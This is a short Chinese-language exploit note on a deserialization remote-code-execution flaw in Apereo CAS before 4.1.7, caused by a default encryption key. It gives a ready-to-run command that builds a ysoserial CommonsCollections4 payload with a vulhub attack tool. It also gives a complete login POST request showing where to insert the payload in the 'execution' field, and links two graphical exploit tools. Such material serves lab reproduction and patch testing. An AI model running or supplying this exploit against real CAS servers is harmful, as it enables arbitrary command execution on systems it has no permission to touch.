## 漏洞概述

[默认密钥]-4.1.x 反序列化RCE

其4.1.7版本之前存在一处默认密钥（changeit）的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令

## 影响范围

```http
Apereo-CAS < 4.1.7
```

## POC

1、使用[Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack)利用ysoserial的CommonsCollections4生成加密后的Payload

```bash
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
```

2、然后登录CAS并抓包，将Body中的`execution`值替换成上面生成的Payload

```http
POST /cas/login HTTP/1.1
Host: your-ip
Content-Length: 2287
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-ip:8080/cas/login
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
Connection: close

username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
```

## EXP

两个都是图形化工具

**EXP1**：cas_exploit-1.0-SNAPSHOT-all.jar

**EXP2**：[@nice0e3](https://github.com/nice0e3/Cas_Exploit)